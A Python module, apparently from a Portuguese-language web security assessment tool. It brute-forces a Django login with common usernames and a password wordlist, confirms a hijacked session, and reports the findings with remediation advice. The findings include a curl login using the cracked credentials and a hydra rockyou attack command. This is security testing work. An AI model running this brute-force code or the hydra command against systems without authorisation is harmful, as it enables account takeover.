import os, time
from lib import common, config

META = {"id": "M17"}
BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
USERS = ["admin", "administrador", "teste", "nexus", "root", "player", "gestor"]

def run(ctx):
    out, f = [], []
    pwds = [l.strip() for l in open(os.path.join(BASE, "wordlists", "passwords.txt"),
                                    encoding="utf-8") if l.strip()][:config.BRUTE_LIMIT]

    t0, tent, achado, bloqueio = time.perf_counter(), 0, None, None
    for user in USERS:
        for pw in pwds:
            ok, r = common.login(ctx, user, pw)
            tent += 1
            if ok:
                achado = (user, pw)
                break
            if r["status"] == 429 or "demasiad" in r["body"].lower():
                bloqueio = tent
                break
            if tent >= config.BRUTE_LIMIT:
                break
        if achado or bloqueio:
            break

    dur = round(time.perf_counter() - t0, 2)
    out.append(f"{tent} tentativas em {dur}s ({round(tent/max(dur, 0.01), 1)} req/s)")

    if achado:
        ctx.state["creds"] = achado
        user, pw = achado
        f.append(common.achado(
            "crit", f"Credenciais válidas: {user} / {pw}",
            f"login 302 com {user}:{pw} após {tent} tentativa(s) em {dur}s",
            "Entrada na aplicação como utilizador real: sessão válida, dados privados "
            "e acções autenticadas (ver M23).",
            [f"curl -c cookies.txt -s http://{ctx.target}:8000/login/ > /dev/null",
             f"# com o csrftoken de cookies.txt:",
             f"curl -b cookies.txt -c cookies.txt -X POST http://{ctx.target}:8000/login/ "
             f"-d 'csrfmiddlewaretoken=TOKEN&nickname={user}&password={pw}' -L"],
            "Passar a password policy (8+, não comum) e a hashing (ver M19)."))

        ok, _ = common.login(ctx, user, pw)
        conf = common.http(ctx.url("/teste/"))
        autenticado = "Online" in conf["body"]
        out.append(f"confirmação de sessão autenticada: {autenticado}")
        if autenticado:
            f.append(common.achado(
                "alto", "Sessão autenticada confirmada",
                "GET /teste/ mostra 'Estado da Sessão: Online' com o utilizador",
                "Prova de acesso efectivo, não apenas de credencial correcta.",
                ["curl -b cookies.txt -s http://%s:8000/teste/ | grep -o 'Online'" % ctx.target],
                ""))

        if not bloqueio:
            f.append(common.achado(
                "alto", "Login sem rate limiting nem lockout",
                f"{tent} tentativas sem throttling a ~{round(tent/max(dur, 0.01), 1)} req/s",
                "Dicionário completo contra qualquer conta é viável; a única defesa é a "
                "força da password — e as passwords estão em texto limpo (M19).",
                ["hydra -l admin -P /usr/share/wordlists/rockyou.txt "
                 f"http://{ctx.target} http-post-form "
                 "'/login/:nickname=^USER^&password=^PASS^&csrfmiddlewaretoken=TOKEN:F=Credenciais'"],
                "django-axes ou django-ratelimit; lockout após 5 falhas."))
    else:
        f.append(common.achado("alto", "Nenhuma credencial fraca na lista",
                               f"{tent} tentativas sem sucesso",
                               "Passwords fora do dicionário comum",
                               corrigir="Correr rockyou completo"))
    return common.resultado("\n".join(out), f)